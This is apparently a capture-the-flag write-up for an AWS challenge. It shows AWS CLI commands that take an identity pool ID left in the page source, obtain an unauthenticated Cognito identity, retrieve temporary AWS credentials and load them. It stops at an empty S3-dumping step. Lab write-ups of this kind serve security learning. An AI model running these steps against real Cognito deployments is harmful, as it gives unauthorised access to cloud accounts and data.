# Challenge 5

## Task
Do I know you?
We configured AWS Cognito as our main identity provider. Let's hope we didn't make any mistakes.

-----

We are provided with:
1. Again, AWS IAM assume role.
2. this IAM policy

<img width="774" height="1055" alt="image" src="https://github.com/user-attachments/assets/dd5598fd-ad46-41e0-bcbb-13f1d496440d" />

-----

Firstly we can see `cognito-sync:*` is there. May be we can find something (UserPoolId, ClientId, IdentityPoolId ?) via viewing the source, if they hardcoded it ?

<img width="1939" height="626" alt="image" src="https://github.com/user-attachments/assets/97e8eef1-03ca-498e-8424-220f69e2a4f2" />

> We are right!

> IdentityPoolId: us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

----

##### Shameless Plugin: I have wrote a detailed blog on exploitation of AWS Cognito before (on AWS Cloud Goat), you can give it a go ^^ : [Blog](https://reveng007.github.io/blog/2024/01/29/CloudGat-AWS-Scenario-2-vulnerable_cognito-(Small-or-Moderate).html)

----

Searched for `aws cognito` cli command, which can be used with `IdentityPoolId`
1. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/create-identity-pool.html
2. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/describe-identity.html
3. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-credentials-for-identity.html
4. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/describe-identity-pool.html
5. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html

### 1. Enumeration 1:

- Tried with `describe-identity-pool` as it has the option of passing `--identity-pool-id` :
```bash
$ aws cognito-identity describe-identity-pool --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
```

<img width="2812" height="408" alt="image" src="https://github.com/user-attachments/assets/4314d838-fade-44fd-9c2a-a77830a65cf6" />

> Oops!!!

- Tried with `get-id` as it has the option of passing `--identity-pool-id` :
```bash
$ aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
```

<img width="1937" height="243" alt="image" src="https://github.com/user-attachments/assets/b9c4ab69-0204-463d-a168-5c54a1618ea7" />

> "IdentityId": "us-east-1:157d6171-ee94-c66b-ed32-62dba3aa1b9b"

### 2. Enumeration 2:

Now, we can try `describe-identity` as it has the option of passing `--identity-id` :
```bash
$ aws cognito-identity describe-identity --identity-id us-east-1:157d6171-ee94-c66b-ed32-62dba3aa1b9b
```

<img width="2797" height="313" alt="image" src="https://github.com/user-attachments/assets/a27a9dc1-55f9-4d49-8056-d32e8dab8af2" />

>  Oops!!!

Up next to `get-credentials-for-identity` as it also has the option of passing `--identity-id` :
```bash
$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-ee94-c66b-ed32-62dba3aa1b9b
```

<img width="2802" height="1185" alt="image" src="https://github.com/user-attachments/assets/2af959ac-1206-48ab-bc1e-52a773a8d816" />

> Worked!

### 3. Exploitation 3:

Let's export it!
```
$ export AWS_ACCESS_KEY_ID=ASIAR...
$ export AWS_SECRET_ACCESS_KEY=/nJch/El5...
$ export AWS_SESSION_TOKEN=IQoJb3JpZ2...
```
> The above approach didn't work!!

### Tried via this [approach](https://docs.aws.amazon.com/cli/latest/reference/configure/set.html#examples)
```
$ aws configure set aws_access_key_id ASIAR...
$ aws configure set aws_secret_access_key XA/D...
$ aws configure set aws_session_token IQoJb3JpZ....
```

<img width="1228" height="213" alt="image" src="https://github.com/user-attachments/assets/9229eb83-e05c-4476-88e4-ea4351ba010f" />

> This also didn't worked!

Frustrated opened my kali and tried to use creds.
<img width="2879" height="1522" alt="image" src="https://github.com/user-attachments/assets/11d31763-4cb9-48da-9c95-4b6bcca105ae" />

 > Worked!!

### 4. Dumping S3:




